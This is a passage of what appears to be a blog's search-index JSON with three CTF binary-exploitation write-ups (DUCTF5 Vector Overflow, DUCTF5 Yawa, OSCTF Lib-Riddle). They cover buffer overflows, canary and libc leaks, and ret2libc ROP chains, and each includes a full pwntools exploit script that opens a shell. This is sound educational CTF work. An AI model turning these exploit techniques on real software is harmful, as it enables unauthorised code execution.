sequence container that encapsulates dynamic size arrays. It is a \u0026ldquo;dynamic size arrays\u0026rdquo;. The value that were found by examining v is a pointer. But there are multiple pointers? Knowing that v were initialized with 5 values, the first pointers has difference value 5 to the 2nd and third pointer. This indicates the size of vector v. This is important because the program will check if vector v has a size of 5 to reach win() function. Lets examine the location of the pointer to make sure that this assumptions is correct.\nx/5c 0x004182b0\npwndbg\u0026gt; x/5c 0x004182b0 0x4182b0:\t88 \u0026#39;X\u0026#39;\t88 \u0026#39;X\u0026#39;\t88 \u0026#39;X\u0026#39;\t88 \u0026#39;X\u0026#39;\t88 \u0026#39;X\u0026#39; The assumptions is correct.\nTesting Buffer Overflow With previous findings, it is time to test out for buffer overflow, first breakpoints before and after the input is needed.\nbreakpoint 1: 0x00000000004013dc breakpoint 2: 0x00000000004013e1 b *0x00000000004013dc b *0x00000000004013e1 Then we run the program.\nBreakpoint 1, 0x00000000004013dc in main () First examine the buffer before our input. Use command x/14wx 0x4051e0 #buf\npwndbg\u0026gt; x/14wx 0x4051e0 0x4051e0 \u0026lt;buf\u0026gt;:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x4051f0 \u0026lt;v\u0026gt;:\t0x004182b0\t0x00000000\t0x004182b5\t0x00000000 0x405200 \u0026lt;v+16\u0026gt;:\t0x004182b5\t0x00000000\t0x00000000\t0x00000000 0x405210:\t0x00000000\t0x00000000 Take note that at 0x4051f0 is the top pointer, at 0x4051f8 and 0x405200 are the bottom pointer. Using pwntools cyclic 30, this payload will be created:-\naaaaaaaabaaaaaaacaaaaaaadaaaaa\nContinue the program and give the payload as input.\nBreakpoint 3, 0x00000000004013e1 in main () pwndbg\u0026gt; x/14wx 0x4051e0 0x4051e0 \u0026lt;buf\u0026gt;:\t0x61616161\t0x61616161\t0x61616162\t0x61616161 0x4051f0 \u0026lt;v\u0026gt;:\t0x61616163\t0x61616161\t0x61616164\t0x00006161 0x405200 \u0026lt;v+16\u0026gt;:\t0x004182b5\t0x00000000\t0x00000000\t0x00000000 0x405210:\t0x00000000\t0x00000000 Top pointer were overwrite by value 0x61616163 and bottom pointer were overwrite by value 0x61616164.\npwndbg\u0026gt; cyclic -l 0x6161616161616163 Finding cyclic pattern of 8 bytes: b\u0026#39;caaaaaaa\u0026#39; (hex: 0x6361616161616161) Found at offset 16 It needs 16 bytes of characters to reach top pointer, and another 8 bytes to reach bottom pointer.\nAttack Strategy Initialy found that the binary is not PIE means the address of buf will stay the same. Additionally, buffer overflow can occur without triggering Stack Canary protection. With these findings, the attack strategy will be:-\nPayload starts with 'DUCTF' as wanted input from the program Overflow the buf Overwrite the top v pointer to the top of the buf Overwrite the bottom pointer to the bottom of 'DUCTF' to ensure the size is 5 Implementation In 64-bit program, address are in 8 bytes long, the payload need to be carefully crafted.\nPayload needs to have the value 'DUCTF', this is only 10 bytes, thus it needs another 6 bytes/3 characters to fit it perfectly. 'DUCTF\\x00\\x00\\x00'. payload = 'DUCTF\\x00\\x00\\x00'\nThe payload has 8 characters/16 bytes. To overflow the buf, 16 characters are needed. 16-8 = 8 payload = 'DUCTF\\x00\\x00\\x00' + '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\nPayload has reach the top pointer of v so append the current payload with value 0x4051e0 which is the top of buf. However we need to consider how x64 address works and little endianness. 0x4051e0 is only 3 bytes long and x64 addresses are 8 bytes long. So need to take note the leading zeros infront. 0x00000000004051e0. the first 4 bytes is the higher bytes and last 4 bytes is the lower bytes of the address. In little endian, the lower bytes goes first in memory, and within the bytes, it is inverted. lower_bytes + high_bytes = '\\xe0\\x51\\x40\\x00' + '\\x00\\x00\\x00\\x00'\nLastly the payload need to be appended with the bottom address of DUCTF Final payload will be:- payload = 'DUCTF\\x00\\x00\\x00' + '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' + '\\xe0\\x51\\x40\\x00' + \\x00\\x00\\x00\\x00 + '\\xe5\\x51\\x40\\x00\nExecution Full Script from pwn import * if args.REMOTE: io = remote(sys.argv[1],sys.argv[2]) else: io = process(\u0026#34;./vector_overflow\u0026#34;, ) elf = context.binary = ELF(\u0026#34;./vector_overflow\u0026#34;, checksec=False) rop = ROP(elf) context.log_level = \u0026#39;debug\u0026#39; payload = \u0026#39;DUCTF\\x00\\x00\\x00\u0026#39; + \u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; + \u0026#39;\\xe0\\x51\\x40\\x00\u0026#39; + \u0026#39;\\x00\\x00\\x00\\x00\u0026#39; + \u0026#39;\\xe5\\x51\\x40\\x00\u0026#39; io.sendline(payload) io.interactive() Flag DUCTF{y0u_pwn3d_th4t_vect0r!!}\n","permalink":"http://localhost:1313/posts/ductf5-vector-overflow/","summary":"\u003cp\u003eThis challenge involves understanding on how Vector Variable were stored in memory for C++. The program able to overflow the Vector Pointer to change where it points to.\u003c/p\u003e\n\u003ch2 id=\"initial-analysis\"\u003eInitial Analysis\u003c/h2\u003e\n\u003ch3 id=\"file-analysis\"\u003eFile Analysis\u003c/h3\u003e\n\u003cp\u003eTo know more about the given executable, we can use \u003ccode\u003efile\u003c/code\u003e command.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efile vector_overflow\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evector_overflow: ELF 64-bit LSB executable, x86-64, version \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSYSV\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esha1\u003cspan style=\"color:#f92672\"\u003e]=\u003c/span\u003e4a0b824c662ee47b5cd3e73176c0092f1fcf714b, \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, not stripped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eKey Findings:-\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e64-bit executable\u003c/li\u003e\n\u003cli\u003enot stripped means the executable has not had its symbol table and relocation information removed.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"executable-security-check\"\u003eExecutable Security Check\u003c/h3\u003e\n\u003cp\u003eTo figure out what security mitigations enabled in this executable, we can use \u003ccode\u003echecksec\u003c/code\u003e command that comes with \u003ccode\u003epwntools\u003c/code\u003e library\u003c/p\u003e","title":"DUCTF5 Vector Overflow [PWN]"},{"content":"This challenge involves exploiting buffer overflow and format string vulnerabilities. The buffer overflow allows us to leverage the format string %s to leak addresses. Additionally, this challenge includes a return-to-libc (ret2libc) attack.\nIntial Analysis In this challenge we were given 4 different files.\nyawa (challenge executable) yawa.c (challenge source code) ld-2.35.so (dynamic linker/loader for the GNU C Library version 2.35) libc.so.6 (main shared library for the GNU C Library) When initially received executable, yawa cannot be run due the executable requirements using specific linker and main shared library. Using pwninit (https://github.com/io12/pwninit), the patching process becomes much easier. Now with the patched binary, it can now be run.\nFile Analysis To know more about the given executable, we can use file command.\nfile yawa_patched yawa_patched: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.35.so, for GNU/Linux 3.2.0, BuildID[sha1]=7f7b72aaab967245353b6816808804a6c4ad2168, not stripped Key Findings:-\nELF 64-bit: The file is in the ELF format and is a 64-bit binary. This means it is designed to run on a 64-bit architecture not stripped: The executable has not had its symbol table and relocation information removed. This means it includes more information which can be helpful for debugging, but makes the file larger. Executable Security Check To figure out what security mitigations enabled in this executable, we can use checksec command that comes with pwntools library\nchecksec --file yawa_patched Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b\u0026#39;.\u0026#39; All the security features are set for this binary.\nCode Analysis #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void init() { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); } int menu() { int choice; puts(\u0026#34;1. Tell me your name\u0026#34;); puts(\u0026#34;2. Get a personalised greeting\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); return choice; } int main() { init(); char name[88]; int choice; while(1) { choice = menu(); if(choice == 1) { read(0, name, 0x88); } else if(choice == 2) { printf(\u0026#34;Hello, %s\\n\u0026#34;, name); } else { break; } } } Code Summary:-\nThe program will ask for option 1 or 2. If option 1 then the program ask for inputs as long as 136 (buffer overflow occur here) If option 2 then the program will print out \u0026ldquo;Hello, (with the name from input)\u0026rdquo; Issue Buffer Overflow\nchar name[88]; read(0, name, 0x88); The name variable is set to size 88 The input take is 0x88 which is 136 Format String\nprintf(\u0026#34;Hello, %s\\n\u0026#34;, name); With the presence of BOF and absence of specifying size of output, format specifier %s can be exploited The %s format specifier in the printf function is used to output a string. When %s is used, printf expects a pointer to a null-terminated string (a sequence of characters ending with the null character \\x00). Payload Crafting Leaking Information To findout what the structure of the program\u0026rsquo;s stack, we can use a debugger such as gdb. First set a breakpoint. Disassemble main function first to identify where to set our breakpoint.\npwndbg\u0026gt; disass main Dump of assembler code for function main: 0x00000000000012b1 \u0026lt;+0\u0026gt;:\tendbr64 0x00000000000012b5 \u0026lt;+4\u0026gt;:\tpush rbp 0x00000000000012b6 \u0026lt;+5\u0026gt;:\tmov rbp,rsp 0x00000000000012b9 \u0026lt;+8\u0026gt;:\tsub rsp,0x70 0x00000000000012bd \u0026lt;+12\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x00000000000012c6 \u0026lt;+21\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax 0x00000000000012ca \u0026lt;+25\u0026gt;:\txor eax,eax 0x00000000000012cc \u0026lt;+27\u0026gt;:\tmov eax,0x0 0x00000000000012d1 \u0026lt;+32\u0026gt;:\tcall 0x11e9 \u0026lt;init\u0026gt; The first 6 lines of this output shows how the stack being initialized. Set a breakpoint at main+25. Then run the program and type in command telescope rsp 25 to view the structure of rsp for 25 values.\n0x00005555555552ca in main () . . . pwndbg\u0026gt; telescope rsp 18 00:0000│ rsp 0x7fffffffdc50 ◂— 0x60 /* \u0026#39;`\u0026#39; */ 01:0008│-068 0x7fffffffdc58 ◂— 0x0 02:0010│-060 0x7fffffffdc60 ◂— 0x1 03:0018│-058 0x7fffffffdc68 ◂— 0x0 ... ↓ 9 skipped 0d:0068│-008 0x7fffffffdcb8 ◂— 0x8d8039ec21141100 0e:0070│ rbp 0x7fffffffdcc0 ◂— 0x1 0f:0078│+008 0x7fffffffdcc8 —▸ 0x7ffff7c29d90 ◂— mov edi, eax The structure of the stack can be seen. Diagram below illustrate the structure of the program\u0026rsquo;s stack.\nTo understand how to exploit %s and leak information. Understanding on how %s were needed. Diagram below shows how %s should work\nThe read() function will read up until \\n which is the null terminator and it will store everything including \\n. However, with the presence of BOF, the way %s works, we can leak information. Diagram below shows how this works.\nCode io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) pause() info(\u0026#39;Leaking Canary\u0026#39;) payload = \u0026#39;A\u0026#39;*88 io.sendline(payload) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;2\u0026#39;) print(io.recvline()) canary = u64(b\u0026#39;\\x00\u0026#39; + io.recv(7)) print(hex(canary)) Previously, we mention %s will output everything up untill null byte \\0. Using this technique, we overflow the buffer until it reaches the canary/address so when the program sends out output, it will leak out the canary/address value.\nThis process can also be done for leaking the return address. Diagram below illustrate how to achieve this. It will take 88 (buf size) + 8 (canary) + 8 (prev rbp) bytes to reach the return address. so we will need \u0026lsquo;A\u0026rsquo; * 103 + \u0026lsquo;\\n\u0026rsquo; to leak it.\nCode io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) payload= \u0026#39;A\u0026#39;*103 info(\u0026#39;Leaking LibC Address\u0026#39;) io.sendline(payload) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;2\u0026#39;) io.recvline() libc_addr = unpack(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) print(f\u0026#34;libc_addr: {hex(libc_addr)}\u0026#34;) Implementation Up until now, the information gathered are\nCanary Return Address Stack Canary protection can now be bypass with the leaked canary, but what can we do with the return address?\nAs of now we dont know the return address offsets.\npwndbg\u0026gt; telescope rsp 25 00:0000│ rsp 0x7fffffffdc50 ◂— 0x60 /* \u0026#39;`\u0026#39; */ 01:0008│-068 0x7fffffffdc58 ◂— 0x100000000 02:0010│ rsi 0x7fffffffdc60 ◂— \u0026#39;AAAAAAAAA\\n\u0026#39; 03:0018│-058 0x7fffffffdc68 ◂— 0xa41 /* \u0026#39;A\\n\u0026#39; */ 04:0020│-050 0x7fffffffdc70 ◂— 0x0 ... ↓ 8 skipped 0d:0068│-008 0x7fffffffdcb8 ◂— 0x447f9070da9cff00 0e:0070│ rbp 0x7fffffffdcc0 ◂— 0x1 0f:0078│+008 0x7fffffffdcc8 —▸ 0x7ffff7c29d90 ◂— mov edi, eax However we can calculate the offset of the return address. The reason to find its offsets because.\nThe LIBC base address will be randomized, however the offsets of each instructions in the LIBC will stay the same. To achieve this, we use command vmmap in gdb pwndbg plugin and find the base address for the libc.\nLibC base address : 0x7ffff7c00000 Return Address : 0x7ffff7c29d90\nOffsets of the Return Address = LibC base address - Return Address = 0x29d90\nNow the base address of LibC has been gained. Every information needed for the Ret-2-LibC attack has been acquired. The payload will be\nPadding up until Canary Canary Padding up until Return Address Return gadget (due to stack allignment issues) pop rdi; ret gadget \u0026lsquo;binsh\u0026rsquo; string location appended libC system address steps 5-7 for the payload can be easily done with pwntools ROP chain function. After send the payload. We need to break out of the loop and let main() function returns to execute our payload. To break the loop we just enter input other than 1 and 2. The code implementation as follows:-\nCode rop =ROP(libc) ret = libc.address + 0x00000000000f8c92 rop.system(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) payload= b\u0026#39;A\u0026#39;*88 + p64(canary) # offsets to rip = 104 payload+= b\u0026#39;A\u0026#39;*(104-len(payload)) payload += p64(ret) payload += rop.chain() io.sendline(payload) io.sendline(b\u0026#39;100\u0026#39;) io.interactive() Execution Full Script from pwn import * if args.REMOTE: io = remote(sys.argv[1],sys.argv[2]) else: io = process(\u0026#34;./yawa_patched\u0026#34;, ) elf = context.binary = ELF(\u0026#34;./yawa_patched\u0026#34;, checksec=False) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) # 0x7fffffffdce8 last in stack can reach context.log_level = \u0026#39;info\u0026#39; offset_canary = 88 offset_to_return = 104 io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) pause() info(\u0026#39;Leaking Canary\u0026#39;) payload = \u0026#39;A\u0026#39;*88 io.sendline(payload) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;2\u0026#39;) print(io.recvline()) canary = u64(b\u0026#39;\\x00\u0026#39; + io.recv(7)) print(hex(canary)) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) payload= \u0026#39;A\u0026#39;*103 info(\u0026#39;Leaking LibC Address\u0026#39;) io.sendline(payload) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;2\u0026#39;) io.recvline() libc_addr = unpack(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) print(f\u0026#34;libc_addr: {hex(libc_addr)}\u0026#34;) print(f\u0026#34;libc_start_main offset: {hex(libc.sym[\u0026#39;__libc_start_main\u0026#39;])}\u0026#34;) base_address = libc_addr -0x29d90 libc.address = base_address print(f\u0026#34;base_address: {hex(libc.address)}\u0026#34;) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(b\u0026#39;1\u0026#39;) rop =ROP(libc) ret = libc.address + 0x00000000000f8c92 rop.system(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) payload= b\u0026#39;A\u0026#39;*88 + p64(canary) # offsets to rip = 104 payload+= b\u0026#39;A\u0026#39;*(104-len(payload)) payload += p64(ret) payload += rop.chain() io.sendline(payload) io.sendline(b\u0026#39;100\u0026#39;) io.interactive() Flag DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}\n","permalink":"http://localhost:1313/posts/ductf5-yawa/","summary":"\u003cp\u003eThis challenge involves exploiting buffer overflow and format string vulnerabilities. The buffer overflow allows us to leverage the format string \u003ccode\u003e%s\u003c/code\u003e to leak addresses. Additionally, this challenge includes a return-to-libc (ret2libc) attack.\u003c/p\u003e\n\u003ch3 id=\"intial-analysis\"\u003eIntial Analysis\u003c/h3\u003e\n\u003cp\u003eIn this challenge we were given 4 different files.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eyawa (challenge executable)\u003c/li\u003e\n\u003cli\u003eyawa.c (challenge source code)\u003c/li\u003e\n\u003cli\u003eld-2.35.so (dynamic linker/loader for the GNU C Library version 2.35)\u003c/li\u003e\n\u003cli\u003elibc.so.6 (main shared library for the GNU C Library)\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWhen initially received executable, yawa cannot be run due the executable requirements using specific linker and main shared library. Using \u003ccode\u003epwninit\u003c/code\u003e (\u003ca href=\"https://github.com/io12/pwninit)\"\u003ehttps://github.com/io12/pwninit)\u003c/a\u003e, the patching process becomes much easier. Now with the patched binary, it can now be run.\u003c/p\u003e","title":"DUCTF5 Yawa [PWN]"},{"content":"This security challenge focuses on exploiting a buffer overflow vulnerability within a provided program file. Using knowledge on Linux calling conventions and Return Oriented Programming (ROP) to achieve the exploit. The ultimate goal is to perform a Ret-2-libC attack without access to the exact LibC library file used by the program.\nQuestion Welcome to Lib-Riddle, where the library holds a secret deep inside its stacks. In this hilarious and intriguing challenge, you\u0026rsquo;ll sift through piles of books and quirky clues to uncover the hidden mystery. Can you crack the code and reveal the library\u0026rsquo;s best-kept secret? Dive in and let the quest for knowledge begin!\nInitial Analysis In this challenge we were given one file. challenge file\nFile Analysis The first two things to do\nrun file command to know what type of file it is challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=57d4054863be1a291a2f3a183a90555f0353d283, for GNU/Linux 3.2.0, not stripped run checksec command to know the security mitigations enabled in this program Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) To summarize the output:-\nFrom the file command output, program is not stripped and this is a 64-bit executable From the checksec command output we see that No stack canary, buffer overflow can be done easily No PIE which means the offset of the functions are the same NX enabled means cannot executed shellcode on the stack Program Execution Analysis The best way to understand the program execution is by running and testing different inputs.\nFrom the above picture, 3 types of inputs are tested\nNormal expected input, to see hows the program\u0026rsquo;s flow The program will take our input and output it back Since there is a reflected output from our input, time to test for format specifier vulnerability sending out %p to expect any hex numbers being output but since %p is being throw back means no format specifier vulnerability Test out if there is any input length check From this test, buffer overflow occur and it can be seen that maybe there is no input length validation Analysis in Ghidra Initially when decompiled the program in ghidra, some of the functions arent named properly. FOr the sake of the length of this writeup, most of the changing variable/function names in ghidra were done outside this writeup. In ghidra, there is no other interesting function other than the main function. This is what main function looks like in ghidra.\nIn this output, the input_buffer variable is set into 16 bytes long. However the read functions will read up to 256 bytes into this variable causing buffer overflow.\nPayload Crafting From the initial analysis, it can be seen that there is no \u0026rsquo;target\u0026rsquo; functions to execute \u0026lsquo;ret-2-win\u0026rsquo; attack. There is no stack canary to bypass. And to execute \u0026lsquo;ret-2-libc\u0026rsquo; attack, it is required to know which version of glibc the program uses on the deployed server.\nLeaking LibC Addresses Before the process of leaking LibC address, first need to know the offsets until reaches the return address on the stack. To achieve this, load the program in gdb and in my case I will be using pwndbg plugin. Use command cyclic [number] to generate a cyclic pattern as input to figure out the offsets until reaches return address.\npwndbg\u0026gt; cyclic 100 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa SIGSEV occured. The offsets wanted can be found on the pwndbg screen output. This is what it looks like:-\nProgram received signal SIGSEGV, Segmentation fault. 0x0000000000401203 in main () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────── RAX 0x0 *RBX 0x401210 (__libc_csu_init) ◂— endbr64 *RCX 0x7ffff7ee3297 (write+23) ◂— cmp rax, -0x1000 /* \u0026#39;H=\u0026#39; */ RDX 0x0 *RDI 0x7ffff7fc37e0 ◂— 0x0 *RSI 0x7ffff7fc2723 (_IO_2_1_stdout_+131) ◂— 0xfc37e0000000000a /* \u0026#39;\\n\u0026#39; */ *R8 0x66 *R9 0x7ffff7fe0d60 ◂— endbr64 *R10 0x3fe52e ◂— 0x6474730064616572 /* \u0026#39;read\u0026#39; */ *R11 0x246 *R12 0x401090 (_start) ◂— endbr64 *R13 0x7fffffffddc0 ◂— 0x1 R14 0x0 R15 0x0 *RBP 0x6161616161616163 (\u0026#39;caaaaaaa\u0026#39;) *RSP 0x7fffffffdcd8 ◂— \u0026#39;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; *RIP 0x401203 (main+141) ◂— ret ─────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────── ► 0x401203 \u0026lt;main+141\u0026gt; ret \u0026lt;0x6161616161616164\u0026gt; ───────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdcd8 ◂— \u0026#39;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 01:0008│ 0x7fffffffdce0 ◂— \u0026#39;eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 02:0010│ 0x7fffffffdce8 ◂— \u0026#39;faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 03:0018│ 0x7fffffffdcf0 ◂— \u0026#39;gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 04:0020│ 0x7fffffffdcf8 ◂— \u0026#39;haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 05:0028│ 0x7fffffffdd00 ◂— \u0026#39;iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 06:0030│ 0x7fffffffdd08 ◂— \u0026#39;jaaaaaaakaaaaaaalaaaaaaamaaa\\n\u0026#39; 07:0038│ 0x7fffffffdd10 ◂— \u0026#39;kaaaaaaalaaaaaaamaaa\\n\u0026#39; ─────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────── ► 0 0x401203 main+141 1 0x6161616161616164 2 0x6161616161616165 3 0x6161616161616166 4 0x6161616161616167 5 0x6161616161616168 6 0x6161616161616169 7 0x616161616161616a ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; If look properly at DISASM / x86-64 / set emulate on terminal, output 0x401203 \u0026lt;main+141\u0026gt; ret \u0026lt;0x6161616161616164\u0026gt; can be seen. This means that the program trying to return to address 0x6161616161616164 which if we decode the hex it will be aaaaaaad. Using the command cyclic -l [pattern], we just use the value 0x6161616161616164 to find out at which offset this pattern starts so we can append it with out target return address\npwndbg\u0026gt; cyclic -l 0x6161616161616164 Finding cyclic pattern of 8 bytes: b\u0026#39;daaaaaaa\u0026#39; (hex: 0x6461616161616161) Found at offset 24 Note: To better understand the further sections, it is advisable to understand what GOT and PLT is. This is a great video by LiveOverflow explaining GOT and PLT. https://www.youtube.com/watch?v=kUk5pw4w0h4\nSo we found it. It takes 24 bytes of characters till the input reached the RIP or the return address. The strategy for leaking the LibC runtime address are :-\nCall puts function Use GOT value as the argument The runtime value of the GOT will be output This is the payload for it\nret = 0x000000000040101a # find using ROPgadget pop_rdi = p64(0x0000000000401273) # find using ROPgadget plt_puts = p64(elf.plt[\u0026#39;puts\u0026#39;]) got_read = p64(elf.got[\u0026#39;read\u0026#39;]) got_puts = p64(elf.got[\u0026#39;puts\u0026#39;]) payload = b\u0026#39;A\u0026#39;*24 payload += pop_rdi + got_puts + plt_puts payload += pop_rdi + got_read + plt_puts payload += p64(elf.sym[\u0026#39;main\u0026#39;]) In summary, this payload is designed to leak the runtime address of the puts function and read functon by calling puts(got_puts) and puts(got_read). This address can then be used to calculate the addresses of other LibC addresses such as the system function.\nLeaking the address, we want to extract the leaked values. This can be done by try and error, the code snippet below is how I extract the leaked informations.\nio.sendline(payload) io.recvline() io.recvline() leak1 = unpack(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) io.recvline() leak2 = unpack(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) Now we want to execute this payload on the Deployed Machine provided by the organiser. This is because we want to leak the libc addresses of their machine. Our local machine currently uses our own glibc. Executing this program will give us this output:-\nglibc functions will have their addresses randomized due to ASLR. However, the last 3 digits of the function will stay the same. Because of this, we can use a libc database search to find out which glibc does the deployed machine uses. https://libc.rip/ is one of the libc database search.\nSearching in the DB gave us 3 results, however these three versions of glibc has the same offsets/address.\nSo just take one of it and use it to proceed for the shell dropping phase. After downloading one of the glibc, we need to patch the program so it will use the correct glibc and not the default one in our machine. To achieve this just use pwninit https://github.com/io12/pwninit and run the command:-\npwninit --binary challenge --libc libc6_2.31-0ubuntu9.14_amd64.so Before Patching:-\n$ ldd challenge linux-vdso.so.1 (0x00007ffdaf9a8000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb3228a2000) /lib64/ld-linux-x86-64.so.2 (0x00007fb322aa2000) After the patch:-\nldd challenge_patched linux-vdso.so.1 (0x00007ffc6f49d000) libc.so.6 =\u0026gt; ./libc.so.6 (0x00007ffbf52dc000) # the program uses the glibc we found ./ld-2.31.so =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007ffbf54d0000) Dropping Shell The glibc version same as the deployed CTF machine has been gained and patched, it is now time to drop a shell in the program. First the libc base address is needed. But since the puts function already been leaked, all that is left is just mathematics\nLibC Base Address = Leaked Puts Address - Puts Offsets in LibC\nlibc.address = leaked_puts - libc.sym[\u0026#39;puts\u0026#39;] Now the base address of LibC has been gained. Every information needed for the Ret-2-LibC attack has been acquired. The payload will be\nPadding up RIP pop rdi; ret gadget \u0026lsquo;binsh\u0026rsquo; string location appended libC system address steps 2-4 for the payload can be easily done with pwntools ROP chain function. After send the payload. The code implementation as follows:-\nlibc.address = leaked_puts - libc.sym[\u0026#39;puts\u0026#39;] rop = ROP(libc) rop.system(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) payload = b\u0026#39;A\u0026#39;*24 payload += rop.chain() io.sendline(payload) io.interactive() Execution Congratulations! The Flag has been Captured!\nFull Script from pwn import * if args.REMOTE: io = remote(sys.argv[1],sys.argv[2]) else: io = process(\u0026#34;./challenge_patched\u0026#34;, ) elf = context.binary = ELF(\u0026#34;./challenge\u0026#34;, checksec=False) context.log_level = \u0026#39;info\u0026#39; libc = ELF(\u0026#39;./libc6_2.31-0ubuntu9.14_amd64.so\u0026#39;) ret = 0x000000000040101a pop_rdi = p64(0x0000000000401273) plt_puts = p64(elf.plt[\u0026#39;puts\u0026#39;]) got_read = p64(elf.got[\u0026#39;read\u0026#39;]) got_puts = p64(elf.got[\u0026#39;puts\u0026#39;]) offset = 24 io.recvuntil(b\u0026#39;name?\\n\u0026#39;) payload = b\u0026#39;A\u0026#39;*24 payload += pop_rdi + got_puts + plt_puts payload += pop_rdi + got_read + plt_puts payload += p64(elf.sym[\u0026#39;main\u0026#39;]) io.sendline(payload) io.recvline() io.recvline() leaked_puts = unpack(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) io.recvline() leaked_read = unpack(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) print(f\u0026#34;leaked_puts: {hex(leaked_puts)}\u0026#34;) print(f\u0026#34;leaked_read: {hex(leaked_read)}\u0026#34;) libc.address = leaked_puts - libc.sym[\u0026#39;puts\u0026#39;] rop = ROP(libc) rop.system(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) payload = b\u0026#39;A\u0026#39;*24 payload += rop.chain() io.sendline(payload) io.interactive() Flag OSCTF{l1br4ry_m4de_0f_5y5call5}\n","permalink":"http://localhost:1313/posts/osctf-libriddle/","summary":"\u003cp\u003eThis security challenge focuses on exploiting a buffer overflow vulnerability within a provided program file. Using knowledge on Linux calling conventions and Return Oriented Programming (ROP) to achieve the exploit. The ultimate goal is to perform a Ret-2-libC attack without access to the exact LibC library file used by the program.\u003c/p\u003e\n\u003ch2 id=\"question\"\u003eQuestion\u003c/h2\u003e\n\u003cp\u003eWelcome to Lib-Riddle, where the library holds a secret deep inside its 